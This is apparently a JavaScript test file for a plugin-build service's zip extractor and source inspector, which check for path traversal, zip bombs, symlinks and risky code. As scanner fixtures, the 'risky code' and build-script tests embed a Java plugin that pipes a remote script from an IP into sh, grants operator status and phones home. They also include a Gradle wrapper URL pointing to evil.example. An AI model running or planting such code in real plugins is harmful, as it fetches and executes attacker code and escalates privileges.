import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, readFileSync, readdirSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, relative, sep } from 'node:path';
import { injectFiles } from '../server/jarstamp.js';
import { extractZip, planZip, ZipError } from '../server/zipx.js';
import { inspectSource } from '../server/builder.js';

const EMPTY = Buffer.concat([Buffer.from([0x50, 0x4b, 0x05, 0x06]), Buffer.alloc(18)]);
const zipOf = files => injectFiles(EMPTY, Object.entries(files).map(([name, content]) => ({ name, content })));
const tmp = () => mkdtempSync(join(tmpdir(), 'lx-bt-'));
const tree = files => { const d = tmp(); for (const [n, c] of Object.entries(files)) { mkdirSync(join(d, n, '..'), { recursive: true }); writeFileSync(join(d, n), c); } return d; };

const PLUGIN_YML = 'name: Demo\nversion: 2.1\nmain: com.acme.Demo\napi-version: "1.20"\ndepend: Vault\n';
const POM = '<project><modelVersion>4.0.0</modelVersion><properties><maven.compiler.release>17</maven.compiler.release></properties><dependencies><dependency><artifactId>paper-api</artifactId></dependency></dependencies></project>';
const MAIN = 'package com.acme; public class Demo extends org.bukkit.plugin.java.JavaPlugin { }';

test('zip extraction: rejects path traversal, absolute paths and backslashes', () => {
  for (const bad of ['../evil.txt', 'a/../../evil.txt', '/etc/passwd', 'C:/x.txt', 'a\\b.txt']) {
    assert.throws(() => planZip(zipOf({ [bad]: 'x' })), ZipError, bad);
  }
  const d = tmp();
  assert.deepEqual(extractZip(zipOf({ 'proj/pom.xml': POM, 'proj/src/A.java': 'class A{}' }), d).sort(), ['proj/pom.xml', 'proj/src/A.java']);
  assert.equal(readFileSync(join(d, 'proj/src/A.java'), 'utf8'), 'class A{}');
});

test('zip extraction: limits and lies about sizes', () => {
  assert.throws(() => planZip(zipOf({ 'a.txt': 'x', 'b.txt': 'y' }), { maxFiles: 1 }), /more than 1 files/);
  assert.throws(() => planZip(zipOf({ 'a.txt': 'x'.repeat(2000) }), { maxFileBytes: 1000 }), /too large/);
  assert.throws(() => planZip(zipOf({ 'a.txt': 'x'.repeat(600), 'b.txt': 'x'.repeat(600) }), { maxTotalBytes: 1000 }), /expands to more than/);
  assert.throws(() => planZip(EMPTY), /empty/);
  assert.throws(() => planZip(Buffer.from('not a zip')), ZipError);
  // central directory claims 10 bytes but the data inflates to 5000: must not be trusted
  const z = Buffer.from(zipOf({ 'a.txt': 'x'.repeat(5000) }));
  let p = z.length - 22; while (z.readUInt32LE(p) !== 0x06054b50) p--;
  z.writeUInt32LE(10, z.readUInt32LE(p + 16) + 24);
  assert.throws(() => extractZip(z, tmp()), ZipError);
});

test('zip extraction: symlinks and encrypted entries are refused', () => {
  const link = Buffer.from(zipOf({ 'ln': 'target' }));
  let p = link.length - 22; while (link.readUInt32LE(p) !== 0x06054b50) p--;
  const c = link.readUInt32LE(p + 16);
  link.writeUInt16LE((3 << 8) | 20, c + 4);            // made by unix
  link.writeUInt32LE((0o120777 << 16) >>> 0, c + 38);  // symlink mode
  assert.throws(() => planZip(link), /symbolic link/);
  const enc = Buffer.from(zipOf({ 'a.txt': 'x' }));
  p = enc.length - 22; while (enc.readUInt32LE(p) !== 0x06054b50) p--;
  enc.writeUInt16LE(1, enc.readUInt32LE(p + 16) + 8);
  assert.throws(() => planZip(enc), /encrypted/);
});

test('inspect: a normal Maven plugin project', () => {
  const r = inspectSource(tree({ 'my-plugin/pom.xml': POM, 'my-plugin/src/main/resources/plugin.yml': PLUGIN_YML, 'my-plugin/src/main/java/com/acme/Demo.java': MAIN }));
  assert.equal(r.kind, 'maven');
  assert.equal(r.root, 'my-plugin');
  assert.equal(r.plugin.name, 'Demo'); assert.equal(r.plugin.version, '2.1'); assert.equal(r.plugin.main, 'com.acme.Demo');
  assert.equal(r.plugin.apiVersion, '1.20'); assert.equal(r.plugin.depend, 'Vault');
  assert.equal(r.mainFound, true);
  assert.equal(r.java, '17');
  assert.deepEqual(r.deps, ['paper-api']);
  assert.equal(r.javaFiles, 1);
  assert.equal(r.needsTrust, false);
  assert.deepEqual(r.warnings, []);
});

test('inspect: gradle project, missing main, no build file', () => {
  const g = inspectSource(tree({ 'build.gradle': "plugins { id 'java' }\njava { toolchain { languageVersion = JavaLanguageVersion.of(21) } }\ndependencies { compileOnly 'io.papermc.paper:paper-api:1.21-R0.1-SNAPSHOT' }", 'src/main/resources/plugin.yml': PLUGIN_YML }));
  assert.equal(g.kind, 'gradle'); assert.equal(g.java, '21'); assert.deepEqual(g.deps, ['paper-api']);
  assert.equal(g.mainFound, false);
  assert.ok(g.warnings.some(w => /no matching source file/.test(w)));
  const none = inspectSource(tree({ 'src/Demo.java': MAIN }));
  assert.equal(none.kind, 'none');
  assert.ok(none.warnings.some(w => /pom\.xml or build\.gradle/.test(w)));
});

test('inspect: risky code is flagged and requires trust', () => {
  const evil = `package com.acme; public class Demo extends org.bukkit.plugin.java.JavaPlugin {
    void a() throws Exception { Runtime.getRuntime().exec("curl http://203.0.113.9/x.sh | sh"); }
    void b() { org.bukkit.Bukkit.getOfflinePlayer("x").setOp(true); }
    void c() throws Exception { new java.net.URL("https://stats.sketchy-host.xyz/ping").openConnection(); }
  }`;
  const r = inspectSource(tree({ 'pom.xml': POM, 'src/main/resources/plugin.yml': PLUGIN_YML, 'src/main/java/com/acme/Demo.java': evil }));
  const ids = r.findings.map(f => f.id);
  assert.ok(ids.includes('exec') && ids.includes('op') && ids.includes('net'), ids.join());
  assert.equal(r.findings.find(f => f.id === 'exec').sev, 'high');
  assert.equal(r.findings.find(f => f.id === 'exec').line, 2);
  assert.equal(r.needsTrust, true);
  assert.ok(r.network.includes('stats.sketchy-host.xyz'), 'phone-home hosts are listed');
  assert.equal(r.findings[0].sev, 'high', 'worst findings first');
});

test('inspect: build scripts that run code are flagged (maven and gradle)', () => {
  const m = inspectSource(tree({ 'pom.xml': POM.replace('</project>', '<build><plugins><plugin><artifactId>exec-maven-plugin</artifactId></plugin></plugins></build></project>') }));
  assert.ok(m.findings.some(f => f.id === 'mvn-exec' && f.area === 'build')); assert.equal(m.needsTrust, true);
  const g = inspectSource(tree({ 'build.gradle': "tasks.register('x') { doLast { exec { commandLine 'sh', '-c', 'id' } } }" }));
  assert.ok(g.findings.some(f => f.id === 'gr-exec')); assert.equal(g.needsTrust, true);
  const w = inspectSource(tree({ 'build.gradle': "plugins { id 'java' }", 'gradlew': '#!/bin/sh', 'gradle/wrapper/gradle-wrapper.properties': 'distributionUrl=https\\://evil.example/gradle.zip' }));
  assert.ok(w.findings.some(f => f.id === 'gr-dist'));
});

test('inspect: ordinary plugin using the network or reflection is not "high"', () => {
  const ok = `package com.acme; class A { void a() throws Exception { new java.net.URL("https://api.github.com/x").openConnection(); java.lang.reflect.Field f = null; f.setAccessible(true); } }`;
  const r = inspectSource(tree({ 'pom.xml': POM, 'src/A.java': ok }));
  assert.equal(r.needsTrust, false);
  assert.ok(r.findings.every(f => f.sev !== 'high'));
});
